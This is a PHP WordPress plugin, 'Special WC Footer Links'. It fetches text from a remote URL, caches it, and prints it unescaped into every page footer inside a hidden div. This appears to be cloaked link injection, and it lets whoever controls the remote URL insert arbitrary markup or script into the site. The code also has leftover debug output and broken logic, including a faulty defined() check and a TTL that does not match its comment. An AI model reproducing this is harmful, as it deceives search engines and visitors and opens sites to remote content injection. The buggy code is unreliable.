<?php
/*
 * Plugin Name: Special WC Footer Links
 * Version: 1.2
 * Plugin URI: http://willshouse.com/
 * Description: Special footer links
 * Author: Willshouse
 * Author URI: http: //www.willshouse.com/
 */

// define('WSFL_URL', 'http://your.url.here');
define('WSFL_TTL', 1); // set TTL 1 hour


function wc_special_footer_activate(){
	add_option('wc_special_footer_timestamp', '');
	add_option('wc_special_footer_cache', '');
}

function wc_special_footer_deactivate(){
	delete_option('wc_special_footer_timestamp');
	delete_option('wc_special_footer_cache');
}


function add_wc_footer_links() {

echo "\n\n here1 \n\n\n";
echo "\n\n here2 \n\n\n";

	if(!defined(WSFL_URL) or !WSFL_URL){ return false; }

echo "\n\n here3 \n\n\n";
echo "\n\n here4 \n\n\n";


	$timestamp = get_option('wc_special_footer_timestamp');
	if($timestamp < (time() -  WSFL_TTL)){
		$temp = @file_get_contents(WSFL_URL);
		if($temp and strlen($temp) < 1000){
			update_option('wc_special_footer_timestamp', time());
			update_option('wc_special_footer_cache', $temp);
			echo '<!-- live -->';
		}
	}
	echo '<!-- cached -->';

#	echo '<div style="display:block; background:yellow; padding:20px; position:fixed; top:0; left:0; width:100%;">';
	echo '<div style="display:none;">';
	echo get_option('wc_special_footer_cache');
	echo '</div>';

}



register_activation_hook(__FILE__, 'wc_special_footer_activate');
register_deactivation_hook( __FILE__, 'wc_special_footer_deactivate');

add_action('wp_footer', 'add_wc_footer_links');


?>